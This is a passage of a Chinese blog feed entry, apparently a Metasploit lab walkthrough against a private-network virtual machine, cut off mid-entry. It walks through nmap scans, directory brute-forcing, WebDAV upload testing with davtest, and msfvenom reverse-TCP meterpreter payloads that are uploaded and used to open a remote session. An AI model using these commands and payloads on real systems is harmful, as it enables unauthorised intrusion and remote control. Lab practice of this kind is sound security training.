&lt;p&gt;Bran Stark, wants to convey an important information to the Sansa back at winterfell. He sends her a message. The message however, is encrypted though.Can you find out what Bran is trying to convey??&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>metasploit渗透流程练习</title>
    <link href="https://cy9nusg4rd3n.github.io/2019/01/25/metasploit%E6%B8%97%E9%80%8F%E6%B5%81%E7%A8%8B%E7%BB%83%E4%B9%A0/"/>
    <id>https://cy9nusg4rd3n.github.io/2019/01/25/metasploit渗透流程练习/</id>
    <published>2019-01-25T09:58:38.000Z</published>
    <updated>2019-01-25T10:49:55.466Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="metasploit学习"><a href="#metasploit学习" class="headerlink" title="metasploit学习"></a>metasploit学习</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><ol><li><strong>测试靶机主要为192.168.114.29,攻击机为192.168.114.176</strong><blockquote><p>db_nmap -v -n -sn 192.168.114.0/24</p></blockquote></li></ol><a id="more"></a><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> Starting Nmap <span class="number">7.60</span> ( <span class="string">https:</span><span class="comment">//nmap.org ) at 2019-01-23 11:36 CST</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Initiating ARP Ping Scan at <span class="number">11</span>:<span class="number">36</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Scanning <span class="number">255</span> hosts [<span class="number">1</span> port/host]</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[*] <span class="string">Nmap:</span> Host is up.</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">256</span> IP addresses (<span class="number">63</span> hosts up) scanned <span class="keyword">in</span> <span class="number">7.80</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">493</span> (<span class="number">13.804</span>KB) | <span class="string">Rcvd:</span> <span class="number">105</span> (<span class="number">2.940</span>KB)</span><br></pre></td></tr></table></figure><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><ol start="2"><li><p>利用msf的db_namp端口扫描</p><blockquote><p>db_nmap -sV -n -v –open -sS -p0-10000 192.168.114.29</p></blockquote></li><li><p>发现开放端口(主要测试8585)</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">Nmap:</span> PORT     STATE SERVICE     VERSION</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">22</span>/tcp   open  ssh         OpenSSH <span class="number">7.1</span> (protocol <span class="number">2.0</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">1617</span>/tcp open  rmiregistry Java RMI</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">3000</span>/tcp open  http        WEBrick httpd <span class="number">1.3</span><span class="number">.1</span> (Ruby <span class="number">2.3</span><span class="number">.3</span> (<span class="number">2016</span><span class="number">-11</span><span class="number">-21</span>))</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">4848</span><span class="regexp">/tcp open  ssl/</span>http    Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">5985</span><span class="regexp">/tcp open  http        Microsoft HTTPAPI httpd 2.0 (SSDP/</span>UPnP)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8020</span>/tcp open  http        Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8027</span>/tcp open  unknown</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8080</span>/tcp open  http        Oracle GlassFish <span class="number">4.0</span> (Servlet <span class="number">3.1</span>; JSP <span class="number">2.3</span>; Java <span class="number">1.8</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8282</span><span class="regexp">/tcp open  http        Apache Tomcat/</span>Coyote JSP engine <span class="number">1.1</span></span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8383</span><span class="regexp">/tcp open  ssl/</span>http    Apache httpd</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">8585</span><span class="regexp">/tcp open  http        Apache httpd 2.2.21 ((Win64) PHP/</span><span class="number">5.3</span><span class="number">.10</span> DAV/<span class="number">2</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> <span class="number">9200</span>/tcp open  http        Elasticsearch REST API <span class="number">1.1</span><span class="number">.1</span> (<span class="string">name:</span> Jean Grey-Summers; Lucene <span class="number">4.7</span>)</span><br><span class="line">[*] <span class="string">Nmap:</span> MAC <span class="string">Address:</span> <span class="number">00</span>:<span class="number">0</span><span class="string">C:</span><span class="number">29</span>:<span class="string">E5:</span><span class="string">F7:</span><span class="number">74</span> (VMware)</span><br><span class="line">[*] <span class="string">Nmap:</span> Service <span class="string">Info:</span> <span class="string">OS:</span> Windows; <span class="string">CPE:</span> <span class="string">cpe:</span>/<span class="string">o:</span><span class="string">microsoft:</span>windows</span><br><span class="line">[*] <span class="string">Nmap:</span> Read data files <span class="string">from:</span> <span class="regexp">/usr/</span>bin<span class="regexp">/../</span>share/nmap</span><br><span class="line">[*] <span class="string">Nmap:</span> Service detection performed. Please report any incorrect results at <span class="string">https:</span><span class="comment">//nmap.org/submit/ .</span></span><br><span class="line">[*] <span class="string">Nmap:</span> Nmap <span class="string">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">2837.85</span> seconds</span><br><span class="line">[*] <span class="string">Nmap:</span> Raw packets <span class="string">sent:</span> <span class="number">41973</span> (<span class="number">1.847</span>MB) | <span class="string">Rcvd:</span> <span class="number">2269</span> (<span class="number">110.612</span>KB)</span><br></pre></td></tr></table></figure></li></ol><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><ol start="4"><li><p>基于msf的dir_scanner</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search dir_scan</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   Name                                Disclosure Date  Rank    Check  Description</span><br><span class="line">   ----                                ---------------  ----    -----  -----------</span><br><span class="line">   auxiliary/scanner/http/dir_scanner                   <span class="built-in">normal</span>  <span class="keyword">Yes</span>    HTTP Directory Scanner</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 &gt; use auxiliary/scanner/http/dir_scanner </span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; show <span class="keyword">options</span> </span><br><span class="line"></span><br><span class="line">Module <span class="keyword">options</span> (auxiliary/scanner/http/dir_scanner):</span><br><span class="line"></span><br><span class="line">   Name        Current Setting                                          Required  Description</span><br><span class="line">   ----        ---------------                                          --------  -----------</span><br><span class="line">   DICTIONARY  /usr/share/metasploit-framework/data/wmap/wmap_dirs.txt  <span class="keyword">no</span>        Path of word dictionary to use</span><br><span class="line">   PATH        /                                                        <span class="keyword">yes</span>       The path  to identify <span class="keyword">files</span></span><br><span class="line">   Proxies                                                              <span class="keyword">no</span>        A proxy chain of format type:host:port[,type:host:port][...]</span><br><span class="line">   RHOSTS                                                               <span class="keyword">yes</span>       The target address range <span class="keyword">or</span> CIDR identifier</span><br><span class="line">   RPORT       <span class="number">80</span>                                                       <span class="keyword">yes</span>       The target port (TCP)</span><br><span class="line">   SSL         false                                                    <span class="keyword">no</span>        Negotiate SSL/TLS <span class="keyword">for</span> outgoing connections</span><br><span class="line">   THREADS     <span class="number">1</span>                                                        <span class="keyword">yes</span>       The number of concurrent threads</span><br><span class="line">   VHOST                                                                <span class="keyword">no</span>        HTTP server virtual host</span><br><span class="line"></span><br><span class="line">msf5 auxiliary(scanner/http/dir_scanner) &gt; <span class="keyword">set</span> threads <span class="comment">30</span></span><br><span class="line">threads <span class="comment">=&gt; 30</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rhosts 192.168.114.29</span></span><br><span class="line">rhosts <span class="comment">=&gt; 192.168.114.29</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; set rport 8585</span></span><br><span class="line">rport <span class="comment">=&gt; 8585</span></span><br><span class="line">msf5 <span class="comment">auxiliary(scanner</span>/http/<span class="comment">dir_scanner) &gt; run</span></span><br><span class="line"></span><br><span class="line">[*] Detecting <span class="comment">error code</span></span><br><span class="line">[*] Using <span class="comment">code</span> <span class="comment">'404'</span><span class="comment"> as not found for 192.168.114.29</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/.../<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/cgi-bin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/icons/<span class="comment"> 404 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/phpmyadmin/<span class="comment"> 403 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/uploads/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[+] Found <span class="comment">http:</span>//<span class="comment">192.168.114.29:8585</span>/wordpress/<span class="comment"> 200 (192.168.114.29)</span></span><br><span class="line">[*] Scanned <span class="comment">1 of 1 hosts (100% complete)</span></span><br><span class="line">[*] Auxiliary <span class="comment">module execution completed</span></span><br></pre></td></tr></table></figure></li><li><p>发现文件上传路径/uploads</p><h2 id="DAVTest上传测试"><a href="#DAVTest上传测试" class="headerlink" title="DAVTest上传测试"></a>DAVTest上传测试</h2><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">NOTERandom string <span class="keyword">for</span> this session: NBIRksdIG8d</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Creating directory</span><br><span class="line">MKCOLFAIL</span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Sending test <span class="keyword">files</span></span><br><span class="line"><span class="keyword">PUT</span>jhtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span>plSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span>shtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span>txtSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span>aspxSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span>phpSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span>cfmSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span>jspSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span>cgiSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span>htmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span>aspSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line"> Checking <span class="keyword">for</span> test <span class="keyword">file</span> execution</span><br><span class="line">EXECjhtmlFAIL</span><br><span class="line">EXECplFAIL</span><br><span class="line">EXECshtmlFAIL</span><br><span class="line">EXECtxtSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">EXECaspxFAIL</span><br><span class="line">EXECphpSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">EXECcfmFAIL</span><br><span class="line">EXECjspFAIL</span><br><span class="line">EXECcgiFAIL</span><br><span class="line">EXEChtmlSUCCEED:http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line">EXECaspFAIL</span><br><span class="line"></span><br><span class="line"><span class="comment">********************************************************</span></span><br><span class="line">/usr/bin/davtest Summary:</span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jhtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.pl</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.shtml</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.aspx</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cfm</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.jsp</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.cgi</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br><span class="line"><span class="keyword">PUT</span> <span class="keyword">File</span>: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.asp</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.txt</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.php</span></span><br><span class="line">Executes: http:<span class="comment">//192.168.114.29:8585/uploads/davtest_NBIRksdIG8d.html</span></span><br></pre></td></tr></table></figure></li><li><p>发现能成功上传txt,php,html</p><h2 id="制作php木马"><a href="#制作php木马" class="headerlink" title="制作php木马"></a>制作php木马</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p php/meterpreter_reverse_tcp <span class="attribute">LHOST</span>=192.168.114.176 <span class="attribute">LPORT</span>=11111 -f<span class="built_in"> raw </span>&gt; ~/Desktop/11111.php</span><br><span class="line">[-] <span class="literal">No</span> platform was selected, choosing Msf::Module::Platform::PHP <span class="keyword">from</span> the payload</span><br><span class="line">[-] <span class="literal">No</span> arch selected, selecting arch: php <span class="keyword">from</span> the payload</span><br><span class="line"><span class="literal">No</span> encoder <span class="keyword">or</span> badchars specified, outputting<span class="built_in"> raw </span>payload</span><br><span class="line">Payload size: 30659 bytes</span><br></pre></td></tr></table></figure></li><li><p>上传一句话菜刀连接也行,但这里主要是基于metasploit的学习，最终远控，权限提升</p><h2 id="向目标传马"><a href="#向目标传马" class="headerlink" title="向目标传马"></a>向目标传马</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# davtest -url http://192.168.114.29:8585/uploads -uploadfile ~/Desktop/11111.php -uploadloc 11111.php</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.114.29:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> unless  Uploading file</span><br><span class="line">Upload succeeded: http://192.168.114.29:8585/uploads/11111.php</span><br></pre></td></tr></table></figure></li></ol><h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit/multi/handler</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> payload php/meterpreter_reverse_tcp</span><br><span class="line">payload =&gt; php/meterpreter_reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; show options </span><br><span class="line"></span><br><span class="line">Module options (exploit/multi/handler):</span><br><span class="line"></span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (php/meterpreter_reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name   Current Setting  Required  Description</span><br><span class="line">   ----   ---------------  --------  -----------</span><br><span class="line">   LHOST                   <span class="literal">yes</span>       The listen<span class="built_in"> address </span>(an<span class="built_in"> interface </span>may be specified)</span><br><span class="line">   LPORT  4444             <span class="literal">yes</span>       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lhost 192.168.114.176</span><br><span class="line">lhost =&gt; 192.168.114.176</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="builtin-name">set</span> lport 11111</span><br><span class="line">lport =&gt; 11111</span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.114.176:11111</span><br></pre></td></tr></table></figure><ol start="9"><li><p>攻击机访问一下<a href="http://192.168.114.29:8585/uploads/11111.php" target="_blank" rel="noopener">http://192.168.114.29:8585/uploads/11111.php</a></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-attr">[*]</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 1 <span class="selector-tag">opened</span> (192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.176</span><span class="selector-pseudo">:11111</span> <span class="selector-tag">-</span>&gt; 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span><span class="selector-pseudo">:53286)</span> <span class="selector-tag">at</span> 2019<span class="selector-tag">-01-23</span> 14<span class="selector-pseudo">:44</span><span class="selector-pseudo">:18</span> +0800</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt;</span><br></pre></td></tr></table></figure></li><li><p>成功弹shell</p></li></ol><h2 id="ms18-8120提权"><a href="#ms18-8120提权" class="headerlink" title="ms18_8120提权"></a>ms18_8120提权</h2><ol start="11"><li><p>查看当前用户</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: LOCAL<span class="built_in"> SERVICE </span>(0)</span><br></pre></td></tr></table></figure></li><li><p>进入shell查systeminfo</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">shell</span></span><br><span class="line"><span class="selector-tag">Process</span> 4520 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Channel</span> 0 <span class="selector-tag">created</span>.</span><br><span class="line"><span class="selector-tag">Microsoft</span> <span class="selector-tag">Windows</span> <span class="selector-attr">[Version 6.1.7601]</span></span><br><span class="line"><span class="selector-tag">Copyright</span> (<span class="selector-tag">c</span>) 2009 <span class="selector-tag">Microsoft</span> <span class="selector-tag">Corporation</span>.  <span class="selector-tag">All</span> <span class="selector-tag">rights</span> <span class="selector-tag">reserved</span>.</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">C</span>:\<span class="selector-tag">wamp</span>\<span class="selector-tag">bin</span>\<span class="selector-tag">apache</span>\<span class="selector-tag">Apache2</span><span class="selector-class">.2</span><span class="selector-class">.21</span>&gt;<span class="selector-tag">systeminfo</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">Terminate</span> <span class="selector-tag">channel</span> 0? <span class="selector-attr">[y/N]</span>  <span class="selector-tag">y</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">shell</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; <span class="selector-tag">sysinfo</span></span><br><span class="line"><span class="selector-attr">[-]</span> <span class="selector-tag">Error</span> <span class="selector-tag">running</span> <span class="selector-tag">command</span> <span class="selector-tag">sysinfo</span>: <span class="selector-tag">Rex</span><span class="selector-pseudo">::TimeoutError</span> <span class="selector-tag">Operation</span> <span class="selector-tag">timed</span> <span class="selector-tag">out</span>.</span><br><span class="line"><span class="selector-tag">meterpreter</span> &gt; </span><br><span class="line"><span class="selector-attr">[*]</span> 192<span class="selector-class">.168</span><span class="selector-class">.114</span><span class="selector-class">.29</span> <span class="selector-tag">-</span> <span class="selector-tag">Meterpreter</span> <span class="selector-tag">session</span> 2 <span class="selector-tag">closed</span>.  <span class="selector-tag">Reason</span>: <span class="selector-tag">Died</span></span><br></pre></td></tr></table></figure></li><li><p>桥接模式下，因为多人共用路由网络太差了，会话很容易断，现在改为NAT模式测试</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.128</span></span><br><span class="line">靶机:<span class="number">192.168</span><span class="meta">.75</span><span class="meta">.134</span></span><br></pre></td></tr></table></figure></li><li><p>构造exe反弹shell上传到靶机</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# msfvenom -p windows/meterpreter<span class="emphasis">_reverse_</span>tcp LHOST=192.168.75.128 LPORT=2222 -f exe -o ~/Desktop/2222.exe</span><br><span class="line">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class="line">[-] No arch selected, selecting arch: x86 from the payload</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: 179779 bytes</span><br><span class="line">Final size of exe file: 254976 bytes</span><br><span class="line">Saved as: /root/Desktop/2222.exe</span><br><span class="line">root@kali:~# davtest -url http://192.168.75.134:8585/uploads -uploadfile ~/Desktop/2222.exe -uploadloc 2222.exe</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span>*</span><br><span class="line"> Testing DAV connection</span><br><span class="line">OPENSUCCEED:http://192.168.75.134:8585/uploads</span><br><span class="line"><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span class="strong">*****</span><span 